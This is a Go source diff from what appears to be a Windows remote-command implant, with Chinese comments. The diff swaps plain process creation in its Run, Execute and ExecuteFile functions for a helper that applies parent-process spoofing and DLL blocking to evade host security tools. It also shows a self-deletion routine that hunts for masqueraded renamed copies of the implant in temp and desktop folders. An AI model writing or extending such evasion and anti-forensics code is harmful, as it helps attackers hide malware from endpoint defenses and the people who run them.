@@ -142,17 +142,11 @@ func Run(b []byte) ([]byte, error) {
 
 	program, _ := windows.UTF16PtrFromString(command)
 
-	err = windows.CreateProcess(
-		nil,
-		program,
-		nil,
-		nil,
-		true,
-		uint32(status),
-		nil,
-		nil,
-		&sI,
-		&pI)
+	// 子进程属性：父进程伪造 + BlockDLLs（主机对抗未启用时返回 nil，退化为普通创建）
+	ca := newChildAttrs()
+	defer ca.Close()
+
+	err = createProcessWithAttrs(program, true, uint32(status), &sI, &pI, ca)
 	if err != nil {
 		return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
 	}
@@ -207,6 +201,7 @@ func Run(b []byte) ([]byte, error) {
 	//return buf[:read.InternalHigh], nil
 	return []byte("success"), nil
 }
+
 // DeleteSelf 删除进程文件（在线）：定位实际映像文件 → 直接删除/改名解锁删除 → 失败挂重试器。
 //
 // os.Executable() 无法保证路径仍指向正确的可执行文件（改名后/被移动后可能失效），
@@ -266,6 +261,7 @@ func DeleteSelf() ([]byte, error) {
 //  1. os.Executable()（当前映像路径，可能失效）
 //  2. 候选目录（用户 temp / 桌面 / OneDrive 桌面）中匹配 ~svc_*.tmp / ~<masq>_*.tmp、
 //     且创建时间在进程启动前后 5 分钟内的自我改名残留文件（覆盖"文件被移动"场景）。
+//
 // 去重返回。
 func locateSelfFiles() []string {
 	set := map[string]bool{}
@@ -373,17 +369,10 @@ func Execute(b []byte) ([]byte, error) {
 
 	var err error
 
-	err = windows.CreateProcess(
-		nil,
-		program,
-		nil,
-		nil,
-		true,
-		uint32(status),
-		nil,
-		nil,
-		&sI,
-		&pI)
+	ca := newChildAttrs()
+	defer ca.Close()
+
+	err = createProcessWithAttrs(program, true, uint32(status), &sI, &pI, ca)
 	if err != nil {
 		return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
 	}
@@ -938,7 +927,9 @@ func ExecuteFile(fileBytes []byte, args string) ([]byte, error) {
 	sI.StdOutput = hWPipe
 	sI.StdErr = hWPipe
 	program, _ := windows.UTF16PtrFromString(command)
-	err := windows.CreateProcess(nil, program, nil, nil, true, status, nil, nil, &sI, &pI)
+	ca := newChildAttrs()
+	defer ca.Close()
+	err := createProcessWithAttrs(program, true, status, &sI, &pI, ca)
 	if err != nil {
 		windows.CloseHandle(hWPipe)
 		return nil, err
